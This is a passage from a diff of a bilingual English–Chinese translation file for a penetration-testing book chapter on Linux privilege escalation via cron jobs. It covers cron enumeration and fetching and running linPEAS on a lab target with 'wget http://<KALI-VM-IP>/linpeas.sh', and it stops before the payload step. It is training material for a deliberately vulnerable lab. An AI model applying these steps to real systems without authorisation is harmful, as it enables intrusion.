@@ -1,55 +1,80 @@
 - en: '*Chapter 12*: Scheduled Tasks'
+  id: totrans-0
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: '*第12章*：计划任务'
 - en: One of the most important privilege escalation vectors on Linux is exploiting
     misconfigured scheduled tasks, also known as **cron jobs**. This chapter will
     focus on the process of enumerating the scheduled tasks running on the target
     system, analyzing them for misconfigurations, and exploiting them to elevate our
     privileges.
+  id: totrans-1
   prefs: []
   type: TYPE_NORMAL
+  zh: Linux 上最重要的权限提升向量之一是利用配置错误的计划任务，也就是 **cron 任务**。本章将专注于枚举目标系统上运行的计划任务，分析这些任务的配置错误，并利用这些错误提升我们的权限。
 - en: We will start this chapter by looking at how Linux implements scheduled tasks
     with cron, after which we will take a look at how to escalate our privileges through
     cron paths. We will then take a look at how to exploit cron wildcards to elevate
     our privileges, before exploring the process of escalating our privileges via
     cron file overwrites.
+  id: totrans-2
   prefs: []
   type: TYPE_NORMAL
+  zh: 我们将从本章开始，首先了解 Linux 如何通过 cron 实现计划任务，然后我们将看看如何通过 cron 路径提升权限。接下来，我们将探讨如何利用 cron
+    通配符来提升权限，最后我们将研究通过 cron 文件覆盖提升权限的过程。
 - en: 'In this chapter, we''re going to cover the following main topics:'
+  id: totrans-3
   prefs: []
   type: TYPE_NORMAL
+  zh: 在本章中，我们将涵盖以下主要内容：
 - en: Introduction to cron jobs
+  id: totrans-4
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: Cron 任务介绍
 - en: Escalation via cron paths
+  id: totrans-5
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 通过 cron 路径提升权限
 - en: Escalation via cron wildcards
+  id: totrans-6
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 通过 cron 通配符提升权限
 - en: Escalation via cron file overwrites
+  id: totrans-7
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: 通过 cron 文件覆盖提升权限
 - en: Technical requirements
+  id: totrans-8
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: 技术要求
 - en: To follow along with the demonstrations in this chapter, you will need to ensure
     that you have familiarity with Linux Terminal commands.
+  id: totrans-9
   prefs: []
   type: TYPE_NORMAL
+  zh: 要跟随本章中的演示，你需要确保你熟悉 Linux 终端命令。
 - en: 'You can view this chapter''s code in action here: [https://bit.ly/3F3747S](https://bit.ly/3F3747S)'
+  id: totrans-10
   prefs: []
   type: TYPE_NORMAL
+  zh: 你可以在这里查看本章代码的实际演示：[https://bit.ly/3F3747S](https://bit.ly/3F3747S)
 - en: Introduction to cron jobs
+  id: totrans-11
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: Cron 任务介绍
 - en: The ability to schedule tasks on an operating system is a vitally important
     feature that can improve the efficiency of the tasks being performed on the system
     and, consequently, the efficiency of the individuals responsible for managing
@@ -59,568 +84,833 @@
     the ability to automate and schedule certain repetitive tasks such as system backups
     is greatly appreciated and is widely implemented by system administrators and
     engineers.
+  id: totrans-12
   prefs: []
   type: TYPE_NORMAL
+  zh: 在操作系统上安排任务的能力是一个至关重要的功能，它可以提高在系统上执行任务的效率，从而提高负责管理和维护系统的个人效率。在通常面向普通终端用户的桌面操作系统中，这一功能可能不会完全实现或被重视，但在
+    Linux 系统中，尤其是作为服务器操作系统使用时，能够自动化并安排某些重复任务（如系统备份）是非常受欢迎的，且被系统管理员和工程师广泛实施。
 - en: Linux implements task scheduling through a utility called **cron**. Cron is
     a time-based service that runs applications, scripts, and other commands repeatedly
     on a specified schedule.
+  id: totrans-13
   prefs: []
   type: TYPE_NORMAL
+  zh: Linux 通过一个名为 **cron** 的工具实现任务调度。Cron 是一个基于时间的服务，用于根据指定的时间表重复运行应用程序、脚本和其他命令。
 - en: An application or script that has been configured to be run repeatedly with
     cron is known as a cron job. Cron can be used to automate or repeat a wide variety
     of functions on a system, from daily backups to system upgrades and patches.
+  id: totrans-14
   prefs: []
   type: TYPE_NORMAL
+  zh: 配置为通过 cron 定期运行的应用程序或脚本被称为 cron 任务。Cron 可以用来自动化或重复系统上的多种功能，从每日备份到系统升级和补丁安装。
 - en: Cron allows you to run a program, script, or command periodically at whatever
     time you choose. These cron jobs are then stored in the **crontab** file.
+  id: totrans-15
   prefs: []
   type: TYPE_NORMAL
+  zh: Cron 允许你在选择的时间周期性地运行程序、脚本或命令。这些 cron 任务随后会存储在 **crontab** 文件中。
 - en: The **crontab** file is a configuration file that is used by the cron utility
     to store and track cron jobs that have been created.
+  id: totrans-16
   prefs: []
   type: TYPE_NORMAL
+  zh: '**crontab** 文件是一个配置文件，由 cron 工具用于存储和跟踪已创建的 cron 任务。'
 - en: Now that you have an understanding of what cron is and what it does, let's take
     a look at how cron jobs are stored in the **crontab** file.
+  id: totrans-17
   prefs: []
   type: TYPE_NORMAL
+  zh: 现在你已经了解了 cron 的功能，我们来看看 cron 任务是如何存储在 **crontab** 文件中的。
 - en: The crontab file
+  id: totrans-18
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
+  zh: Crontab 文件
 - en: 'You can list the cron jobs running on a system by running the following command
     on the target system:'
+  id: totrans-19
   prefs: []
   type: TYPE_NORMAL
+  zh: 你可以通过在目标系统上运行以下命令来列出正在运行的 cron 任务：
 - en: crontab
+  id: totrans-20
   prefs: []
   type: TYPE_NORMAL
+  zh: crontab
 - en: 'Alternatively, if the user you are currently logged in as doesn''t have the
     necessary permissions to utilize the **crontab** command, you can also manually
     display the contents of the **crontab** file by running the following command:'
+  id: totrans-21
   prefs: []
   type: TYPE_NORMAL
+  zh: 或者，如果您当前登录的用户没有使用**crontab**命令的必要权限，您还可以通过运行以下命令手动显示**crontab**文件的内容：
 - en: cat /etc/crontab
+  id: totrans-22
   prefs: []
   type: TYPE_NORMAL
+  zh: cat /etc/crontab
 - en: 'As shown in the following screenshot, this will output a list of all active
     cron jobs, as well as their respective schedules, applications, scripts, or commands
     they have been configured to run:'
+  id: totrans-23
   prefs: []
   type: TYPE_NORMAL
+  zh: 如下图所示，这将输出所有活动的cron作业列表，以及它们各自的调度、应用程序、脚本或命令。
 - en: '![Figure 12.1 – Contents of the crontab file'
+  id: totrans-24
   prefs: []
   type: TYPE_NORMAL
+  zh: '![图 12.1 – crontab文件内容'
 - en: '](Images/B17389_12_001.jpg)'
+  id: totrans-25
   prefs: []
   type: TYPE_NORMAL
+  zh: '](Images/B17389_12_001.jpg)'
 - en: Figure 12.1 – Contents of the crontab file
+  id: totrans-26
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 12.1 – crontab文件内容
 - en: To understand how we can exploit cron jobs to elevate our privileges, we need
     to have an understanding of how the **crontab** file is structured and how the
     schedules for the cron jobs are configured.
+  id: totrans-27
   prefs: []
   type: TYPE_NORMAL
+  zh: 要理解我们如何利用cron作业来提升权限，我们需要了解**crontab**文件的结构以及cron作业的调度是如何配置的。
 - en: 'This can be achieved through a simple example. The **crontab** entry highlighted
     in the following screenshot schedules the command to be run at the 17th minute
     of every hour, repeatedly:'
+  id: totrans-28
   prefs: []
   type: TYPE_NORMAL
+  zh: 这可以通过一个简单的示例来实现。以下截图中突出显示的**crontab**条目安排命令在每小时的第17分钟反复运行：
 - en: '![Figure 12.2 – Example of a cron job'
+  id: totrans-29
   prefs: []
   type: TYPE_NORMAL
+  zh: '![图 12.2 – Cron作业示例'
 - en: '](Images/B17389_12_002.jpg)'
+  id: totrans-30
   prefs: []
   type: TYPE_NORMAL
+  zh: '](Images/B17389_12_002.jpg)'
 - en: Figure 12.2 – Example of a cron job
+  id: totrans-31
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 12.2 – Cron作业示例
 - en: 'The first five fields at the beginning of the cron job entry are used to specify
     the scheduled time. These fields are used to specify the following values:'
+  id: totrans-32
   prefs: []
   type: TYPE_NORMAL
+  zh: cron作业条目开头的前五个字段用于指定调度时间。这些字段用于指定以下值：
 - en: '**Minute (0 – 59)**: Used to specify the minute the cron job should be run.'
+  id: totrans-33
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**分钟（0 – 59）**：用于指定cron作业应运行的具体分钟。'
 - en: '**Hour (0 – 23)**: Used to specify the hour of the day the cron job should
     be run.'
+  id: totrans-34
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**小时（0 – 23）**：用于指定cron作业应运行的具体小时。'
 - en: '**Day of the month (1 – 31)**: Used to specify the specific day of the month
     the cron job should be run.'
+  id: totrans-35
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**日期（1 – 31）**：用于指定cron作业应运行的具体日期。'
 - en: '**Month (1 – 12)**: Used to specify the month when the cron job should be run.'
+  id: totrans-36
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**月份（1 – 12）**：用于指定cron作业应运行的月份。'
 - en: '**Day of the week (0 – 7)**: Used to specify the day of the week when the cron
     job should be run.'
+  id: totrans-37
   prefs:
   - PREF_UL
   type: TYPE_NORMAL
+  zh: '**星期几（0 – 7）**：用于指定cron作业应运行的星期几。'
 - en: 'As you may have noticed, some fields have an asterisk (*****) as a value, which
     means that the cron job will run on all of the hours, days, weeks, and months
     unless specified otherwise. In this case, the cron job will run at the 17th minute
     of every hour, day, month, and day of the week:'
+  id: totrans-38
   prefs: []
   type: TYPE_NORMAL
+  zh: 正如您可能注意到的，某些字段的值为星号（*****），这意味着cron作业将运行在所有小时、日期、周和月份，除非另有指定。在这种情况下，cron作业将在每小时、每天、每月以及每周的第17分钟运行：
 - en: '![Figure 12.3 – Cron job syntax'
+  id: totrans-39
   prefs: []
   type: TYPE_NORMAL
+  zh: '![图 12.3 – Cron作业语法'
 - en: '](Images/B17389_12_003.jpg)'
+  id: totrans-40
   prefs: []
   type: TYPE_NORMAL
+  zh: '](Images/B17389_12_003.jpg)'
 - en: Figure 12.3 – Cron job syntax
+  id: totrans-41
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 12.3 – Cron作业语法
 - en: The preceding screenshot outlines the syntax of a cron job and the various fields
     that can be customized to configure the schedule for the cron job.
+  id: totrans-42
   prefs: []
   type: TYPE_NORMAL
+  zh: 上面的截图概述了cron作业的语法以及可以自定义的各种字段，用于配置cron作业的调度。
 - en: Cron jobs can also be run as any user on the system. This is a very important
     factor to keep an eye on as we will be targeting cron jobs that have been configured
     to be run as the root user. This is primarily because any script or command that
     is run by a cron job will run as the root user and, consequently, provide us with
     root access.
+  id: totrans-43
   prefs: []
   type: TYPE_NORMAL
+  zh: Cron作业也可以作为系统中的任何用户运行。这是一个非常重要的因素，因为我们将关注那些被配置为以root用户身份运行的cron作业。主要原因是，任何由cron作业运行的脚本或命令都将作为root用户运行，因此为我们提供root访问权限。
 - en: Now that you have an understanding of how cron jobs work and how they are configured,
     we can begin the process of analyzing them for misconfigurations to elevate our
     privileges.
+  id: totrans-44
   prefs: []
   type: TYPE_NORMAL
+  zh: 现在您已经了解了cron作业是如何工作的以及如何配置它们，我们可以开始分析它们的配置错误，从而提升我们的权限。
 - en: In this chapter, we will be utilizing the virtual machine we set up in [*Chapter
     11*](B17389_11_Final_PG_ePub.xhtml#_idTextAnchor152), *Linux Password Mining*.
     This is because the virtual machine has been configured to be vulnerable and has
     various cron jobs that can be used to demonstrate various privilege escalation
     techniques.
+  id: totrans-45
   prefs: []
   type: TYPE_NORMAL
+  zh: 在本章中，我们将使用我们在 [*第 11 章*](B17389_11_Final_PG_ePub.xhtml#_idTextAnchor152) 中设置的虚拟机，*Linux
+    密码挖掘*。这是因为该虚拟机已配置为易受攻击，并且有各种 cron 任务可以用来演示不同的权限提升技术。
 - en: Escalation via cron paths
+  id: totrans-46
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
+  zh: 通过 cron 路径提升权限
 - en: The first privilege escalation technique we will be exploring is the process
     of exploiting poorly configured cron paths. However, before we can begin this
     process, let's take a quick look at the various ways of accessing the **crontab**
     file on the target system.
+  id: totrans-47
   prefs: []
   type: TYPE_NORMAL
+  zh: 我们将探索的第一个权限提升技术是利用配置不当的 cron 路径。然而，在我们开始这一过程之前，让我们快速了解一下在目标系统上访问 **crontab**
+    文件的各种方法。
 - en: The reason we need to do this is because we will come across systems that have
     been configured differently and can access the **crontab** file, so enumerating
     cron jobs running on a system is vitally important in the privilege escalation
     process.
+  id: totrans-48
   prefs: []
   type: TYPE_NORMAL
+  zh: 我们需要这样做的原因是，因为我们会遇到已经配置不同且可以访问 **crontab** 文件的系统，因此枚举系统上运行的 cron 任务在权限提升过程中至关重要。
 - en: 'As demonstrated in the previous section, you can access the **crontab** file
     on the target system by running the following command:'
+  id: totrans-49
   prefs: []
   type: TYPE_NORMAL
+  zh: 如前节所示，您可以通过运行以下命令访问目标系统上的 **crontab** 文件：
 - en: crontab
+  id: totrans-50
   prefs: []
   type: TYPE_NORMAL
+  zh: crontab
 - en: 'This command may not yield any results if access to the utility has been limited
     by the administrator. However, you can use the following commands to enumerate
     information regarding the active cron jobs on the system:'
+  id: totrans-51
   prefs: []
   type: TYPE_NORMAL
+  zh: 如果管理员已限制对该工具的访问，则此命令可能不会返回任何结果。然而，您可以使用以下命令来枚举系统中活动的 cron 任务信息：
 - en: crontab -l
+  id: totrans-52
   prefs: []
   type: TYPE_NORMAL
+  zh: crontab -l
 - en: ls -alh /var/spool/cron;
+  id: totrans-53
   prefs: []
   type: TYPE_NORMAL
+  zh: ls -alh /var/spool/cron;
 - en: ls -al /etc/ | grep cron
+  id: totrans-54
   prefs: []
   type: TYPE_NORMAL
+  zh: ls -al /etc/ | grep cron
 - en: ls -al /etc/cron*
+  id: totrans-55
   prefs: []
   type: TYPE_NORMAL
+  zh: ls -al /etc/cron*
 - en: cat /etc/cron*
+  id: totrans-56
   prefs: []
   type: TYPE_NORMAL
+  zh: cat /etc/cron*
 - en: cat /etc/at.allow
+  id: totrans-57
   prefs: []
   type: TYPE_NORMAL
+  zh: cat /etc/at.allow
 - en: cat /etc/at.deny
+  id: totrans-58
   prefs: []
   type: TYPE_NORMAL
+  zh: cat /etc/at.deny
 - en: cat /etc/cron.allow
+  id: totrans-59
   prefs: []
   type: TYPE_NORMAL
+  zh: cat /etc/cron.allow
 - en: cat /etc/cron.deny*
+  id: totrans-60
   prefs: []
   type: TYPE_NORMAL
+  zh: cat /etc/cron.deny*
 - en: Accessing the files and directories listed here should yield information regarding
     the active cron jobs on the system.
+  id: totrans-61
   prefs: []
   type: TYPE_NORMAL
+  zh: 访问此处列出的文件和目录应该能够提供有关系统中活动的 cron 任务的信息。
 - en: Enumeration with linPEAS
+  id: totrans-62
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
+  zh: 使用 linPEAS 进行枚举
 - en: We can also enumerate the various cron jobs running on a system with automated
     tools. This can be done by using **linux-exploit-suggester** or other enumeration
     scripts and tools. In this case, we will utilize the **linPEAS** script to enumerate
     information from our target.
+  id: totrans-63
   prefs: []
   type: TYPE_NORMAL
+  zh: 我们还可以使用自动化工具枚举系统上运行的各种 cron 任务。这可以通过使用 **linux-exploit-suggester** 或其他枚举脚本和工具来完成。在本例中，我们将使用
+    **linPEAS** 脚本来枚举目标系统的信息。
 - en: Note
+  id: totrans-64
   prefs: []
   type: TYPE_NORMAL
+  zh: 注意
 - en: linPEAS is a local Linux enumeration script that searches and scans for potential
     vulnerabilities, and also enumerates all important system information that can
     be used to stage a privilege escalation attack.
+  id: totrans-65
   prefs: []
   type: TYPE_NORMAL
+  zh: linPEAS 是一个本地 Linux 枚举脚本，用于搜索和扫描潜在的漏洞，并枚举所有可以用于进行权限提升攻击的系统重要信息。
 - en: 'The linPEAS binary can be downloaded from the following GitHub repository:
     [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).'
+  id: totrans-66
   prefs: []
   type: TYPE_NORMAL
+  zh: linPEAS 二进制文件可以从以下 GitHub 仓库下载：[https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)。
 - en: 'Ensure you download the **linpeas.sh** Bash script, as highlighted in the following
     screenshot:'
+  id: totrans-67
   prefs: []
   type: TYPE_NORMAL
+  zh: 确保下载 **linpeas.sh** Bash 脚本，如下图所示：
 - en: '![Figure 12.4 – linPEAS Bash script'
+  id: totrans-68
   prefs: []
   type: TYPE_NORMAL
+  zh: '![图 12.4 – linPEAS Bash 脚本'
 - en: '](Images/B17389_12_004.jpg)'
+  id: totrans-69
   prefs: []
   type: TYPE_NORMAL
+  zh: '](Images/B17389_12_004.jpg)'
 - en: Figure 12.4 – linPEAS Bash script
+  id: totrans-70
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 12.4 – linPEAS Bash 脚本
 - en: After downloading the Bash script to our Kali VM, we need to transfer the **linpeas.sh**
     file to our target virtual machine. This cannot be done automatically as we do
     not have a Meterpreter session. As a result, we will need to make use of Linux-specific
     utilities to download the binary.
+  id: totrans-71
   prefs: []
   type: TYPE_NORMAL
+  zh: 下载 Bash 脚本到我们的 Kali 虚拟机后，我们需要将 **linpeas.sh** 文件传输到目标虚拟机。这不能自动完成，因为我们没有 Meterpreter
+    会话。因此，我们需要使用特定于 Linux 的实用程序来下载该二进制文件。
 - en: Transferring files
+  id: totrans-72
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
+  zh: 文件传输
 - en: 'To transfer the **linpeas.sh** file to our target, we will need to set up a
     web server on our Kali VM that will be used to host the file. This will allow
     us to download it on the target system. This can be done by following these steps:'
+  id: totrans-73
   prefs: []
   type: TYPE_NORMAL
+  zh: 要将**linpeas.sh**文件传输到目标系统，我们需要在 Kali VM 上设置一个 Web 服务器来托管该文件。这将允许我们在目标系统上下载该文件。可以按照以下步骤操作：
 - en: 'To set up a web server on our Kali VM, we can utilize the **SimpleHTTPServer**
     Python module to serve the binary file. This can be done by running the following
     command in the directory where the **linpeas.sh** binary is stored:'
+  id: totrans-74
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 要在 Kali VM 上设置 Web 服务器，我们可以利用**SimpleHTTPServer** Python 模块来提供该二进制文件。可以通过在存储**linpeas.sh**二进制文件的目录中运行以下命令来完成此操作：
 - en: '**sudo python -m SimpleHTTPServer 80**'
+  id: totrans-75
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '**sudo python -m SimpleHTTPServer 80**'
 - en: Note
+  id: totrans-76
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 注意
 - en: '**SimpleHTTPServer** is a Python module for Python 2 that is also available
     for Python 3 as **http.server**.'
+  id: totrans-77
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '**SimpleHTTPServer**是一个适用于 Python 2 的 Python 模块，Python 3 中也有可用的**http.server**模块。'
 - en: 'As highlighted in the following screenshot, the **SimpleHTTPServer** module
     will serve the files in the directory on the Kali VM IP address on port **80**:'
+  id: totrans-78
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 如下图所示，**SimpleHTTPServer**模块将会在 Kali VM 的 IP 地址上通过端口**80**提供该目录中的文件：
 - en: '![Figure 12.5 – SimpleHTTPServer linpeas'
+  id: totrans-79
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '![图 12.5 – SimpleHTTPServer linpeas'
 - en: '](Images/B17389_12_005.jpg)'
+  id: totrans-80
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '](Images/B17389_12_005.jpg)'
 - en: Figure 12.5 – SimpleHTTPServer linpeas
+  id: totrans-81
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 图 12.5 – SimpleHTTPServer linpeas
 - en: To download the **linpeas.sh** file on the target system, we can utilize the
     **wget** utility. Before we can download the binary, however, we need to navigate
     to a directory where we have read and write permissions. In this case, we will
     navigate to the temporary directory, as illustrated in the following screenshot:![Figure
     12.6 – Linux temporary directory
+  id: totrans-82
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 要在目标系统上下载**linpeas.sh**文件，我们可以利用**wget**工具。然而，在下载二进制文件之前，我们需要导航到一个具有读写权限的目录。在这种情况下，我们将导航到临时目录，如下图所示：![图
+    12.6 – Linux 临时目录
 - en: '](Images/B17389_12_006.jpg)'
+  id: totrans-83
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '](Images/B17389_12_006.jpg)'
 - en: Figure 12.6 – Linux temporary directory
+  id: totrans-84
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 图 12.6 – Linux 临时目录
 - en: 'We can now use the **wget** utility to download the file from the Kali VM to
     our target system. This can be done by running the following command on the target
     system:'
+  id: totrans-85
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 现在我们可以使用**wget**工具将文件从 Kali VM 下载到我们的目标系统。可以通过在目标系统上运行以下命令来完成此操作：
 - en: '**wget http://<KALI-VM-IP>/linpeas.sh**'
+  id: totrans-86
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '**wget http://<KALI-VM-IP>/linpeas.sh**'
 - en: 'The output is shown in the following screenshot:'
+  id: totrans-87
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 输出如下截图所示：
 - en: '![Figure 12.7 – wget linPEAS'
+  id: totrans-88
   prefs: []
   type: TYPE_NORMAL
+  zh: '![图 12.7 – wget linPEAS'
 - en: '](Images/B17389_12_007.jpg)'
+  id: totrans-89
   prefs: []
   type: TYPE_NORMAL
+  zh: '](Images/B17389_12_007.jpg)'
 - en: Figure 12.7 – wget linPEAS
+  id: totrans-90
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 12.7 – wget linPEAS
 - en: As shown in the preceding screenshot, if the transfer is successful, the **linpeas.sh**
     file should be downloaded and saved with the name we specified.
+  id: totrans-91
   prefs: []
   type: TYPE_NORMAL
+  zh: 如前面的截图所示，如果传输成功，**linpeas.sh**文件应已下载并保存为我们指定的文件名。
 - en: We can now use the **linpeas.sh** script to enumerate the various cron jobs
     running on the target system.
+  id: totrans-92
   prefs: []
   type: TYPE_NORMAL
+  zh: 我们现在可以使用**linpeas.sh**脚本来列举目标系统上运行的各种 cron 作业。
 - en: Finding cron jobs with linPEAS
+  id: totrans-93
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
+  zh: 使用 linPEAS 查找 cron 作业
 - en: 'The **linpeas.sh** script enumerates a lot of information and will perform
     various checks to discover potential vulnerabilities on the target system. We
     can use the **linpeas.sh** script to enumerate and locate the cron jobs running
     on the system. This can be done by following these steps:'
+  id: totrans-94
   prefs: []
   type: TYPE_NORMAL
+  zh: '**linpeas.sh**脚本列举了大量信息，并执行各种检查以发现目标系统上的潜在漏洞。我们可以使用**linpeas.sh**脚本列举并定位系统上运行的
+    cron 作业。可以按照以下步骤进行：'
 - en: 'To enumerate all the important system information, we need to run the **linpeas.sh**
     script. However, before we do that, we need to ensure the script has executable
     permissions. This can be done by running the following command in the target:'
+  id: totrans-95
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 要列举所有重要的系统信息，我们需要运行**linpeas.sh**脚本。然而，在此之前，我们需要确保脚本具有可执行权限。可以通过在目标上运行以下命令来完成此操作：
 - en: '**chmod +x linpeas.sh**'
+  id: totrans-96
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '**chmod +x linpeas.sh**'
 - en: 'Alternatively, you can modify the permissions of the **linpeas.sh** script
     by running the following command:'
+  id: totrans-97
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 或者，你可以通过运行以下命令修改**linpeas.sh**脚本的权限：
 - en: '**chmod 775 linpeas.sh**'
+  id: totrans-98
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '**chmod 775 linpeas.sh**'
 - en: 'We can now run the **linpeas.sh** script by running the following command on
     the target:'
+  id: totrans-99
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 现在我们可以通过在目标上运行以下命令来执行**linpeas.sh**脚本：
 - en: '**bash linpeas.sh**'
+  id: totrans-100
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '**bash linpeas.sh**'
 - en: 'As shown in the following screenshot, the script will enumerate system information
     and display a list of cron jobs running on the system, as well as the default
     **$PATH** variable:'
+  id: totrans-101
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: 如下图所示，脚本将列举系统信息并显示系统上运行的 cron 作业列表，以及默认的**$PATH**变量：
 - en: '![Figure 12.8 – linPEAS cron jobs'
+  id: totrans-102
   prefs: []
   type: TYPE_NORMAL
+  zh: '![图 12.8 – linPEAS cron 作业'
 - en: '](Images/B17389_12_008.jpg)'
+  id: totrans-103
   prefs: []
   type: TYPE_NORMAL
+  zh: '](Images/B17389_12_008.jpg)'
 - en: Figure 12.8 – linPEAS cron jobs
+  id: totrans-104
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 12.8 – linPEAS cron 作业
 - en: In this case, our target is running two cron jobs as the **root** user that
     have been configured to run every 1 minute. We can use this information to identify
     specific misconfigurations in the scripts and commands that are executed by the
     cron jobs.
+  id: totrans-105
   prefs: []
   type: TYPE_NORMAL
+  zh: 在这种情况下，我们的目标正在以 **root** 用户身份运行两个 cron 作业，这些作业已配置为每 1 分钟运行一次。我们可以利用这些信息来识别在
+    cron 作业执行的脚本和命令中可能存在的特定配置错误。
 - en: Now that we have been able to enumerate the various cron jobs running on the
     target system, we can begin the privilege escalation process.
+  id: totrans-106
   prefs: []
   type: TYPE_NORMAL
+  zh: 现在我们已经能够列出目标系统上运行的各种 cron 作业，我们可以开始权限提升过程。
 - en: Escalating privileges via cron paths
+  id: totrans-107
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
+  zh: 通过 cron 路径提升权限
 - en: 'This particular privilege escalation technique involves identifying the default
     **$PATH** variable that''s been configured for cron jobs in the **crontab** file,
     generating a payload, and placing it in the path:'
+  id: totrans-108
   prefs: []
   type: TYPE_NORMAL
+  zh: 这种特定的权限提升技术涉及识别为 cron 作业在 **crontab** 文件中配置的默认 **$PATH** 变量，生成有效负载，并将其放入路径中：
 - en: '![Figure 12.9 – The PATH variable'
+  id: totrans-109
   prefs: []
   type: TYPE_NORMAL
+  zh: '![图 12.9 – PATH 变量'
 - en: '](Images/B17389_12_009.jpg)'
+  id: totrans-110
   prefs: []
   type: TYPE_NORMAL
+  zh: '](Images/B17389_12_009.jpg)'
 - en: Figure 12.9 – The PATH variable
+  id: totrans-111
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 12.9 – PATH 变量
 - en: Note
+  id: totrans-112
   prefs: []
   type: TYPE_NORMAL
+  zh: 注意
 - en: The **$PATH** variable is used to set the default path that the cron jobs will
     run from, unless specified otherwise.
+  id: totrans-113
   prefs: []
   type: TYPE_NORMAL
+  zh: '**$PATH** 变量用于设置 cron 作业运行的默认路径，除非另有指定。'
 - en: As highlighted in the preceding screenshot, the **$PATH** variable has been
     set as the home directory of the **user** account. This means that, by default,
     all the cron jobs will run from the **user** account's home directory, unless
     specified otherwise.
+  id: totrans-114
   prefs: []
   type: TYPE_NORMAL
+  zh: 如前述截图所示，**$PATH** 变量已被设置为 **user** 账户的主目录。这意味着，默认情况下，所有的 cron 作业将从 **user**
+    账户的主目录运行，除非另有指定。
 - en: This can be construed as a misconfiguration as the **user** account can access
     files and scripts that are used by the cron jobs. We can exploit this misconfiguration
     by identifying cron jobs that utilize scripts or binaries that are stored in the
     **user** account's home directory.
+  id: totrans-115
   prefs: []
   type: TYPE_NORMAL
+  zh: 这可以被理解为一种配置错误，因为 **user** 账户可以访问 cron 作业使用的文件和脚本。我们可以通过识别利用存储在 **user** 账户主目录中的脚本或二进制文件的
+    cron 作业来利用这一配置错误。
 - en: 'Analyzing the **crontab** file reveals an interesting cron job that runs a
     Bash script named **overwrite.sh** as the **root** user:'
+  id: totrans-116
   prefs: []
   type: TYPE_NORMAL
+  zh: 分析 **crontab** 文件揭示了一个有趣的 cron 作业，该作业以 **root** 用户身份运行一个名为 **overwrite.sh**
+    的 Bash 脚本：
 - en: '![Figure 12.10 – Overwrite cron job'
+  id: totrans-117
   prefs: []
   type: TYPE_NORMAL
+  zh: '![图 12.10 – 覆盖 cron 作业'
 - en: '](Images/B17389_12_010.jpg)'
+  id: totrans-118
   prefs: []
   type: TYPE_NORMAL
+  zh: '](Images/B17389_12_010.jpg)'
 - en: Figure 12.10 – Overwrite cron job
+  id: totrans-119
   prefs: []
   type: TYPE_NORMAL
+  zh: 图 12.10 – 覆盖 cron 作业
 - en: As highlighted in the preceding screenshot, the cron job has also been configured
     to run every 1 minute of every hour, every day, and every month.
+  id: totrans-120
   prefs: []
   type: TYPE_NORMAL
+  zh: 如前述截图所示，cron 作业还已配置为每小时的每一分钟、每天、每月都执行一次。
 - en: 'Now that we have identified a potential cron job that has the necessary requirements,
     we can begin the privilege escalation process:'
+  id: totrans-121
   prefs: []
   type: TYPE_NORMAL
+  zh: 现在我们已经识别出一个符合要求的 cron 作业，我们可以开始权限提升过程：
 - en: 'The first step in this process involves locating and identifying the location
     of the **overwrite.sh** script that is run by the cron job. We were able to determine
     the default path used by the cron job is the **user** account''s home directory.
     We can display the contents of the directory by running the following command:'
+  id: totrans-122
   prefs:
   - PREF_OL
   type: TYPE_NORMAL
+  zh: 这个过程的第一步是定位并识别 cron 作业运行的 **overwrite.sh** 脚本的位置。我们已经能够确定 cron 作业使用的默认路径是 **user**
+    账户的主目录。我们可以通过运行以下命令来显示该目录的内容：
 - en: '**ls -al /home/user/**'
+  id: totrans-123
   prefs:
   - PREF_IND
   type: TYPE_NORMAL
+  zh: '**ls -al /home/user/**'
 - en: 'The output is as follows:'
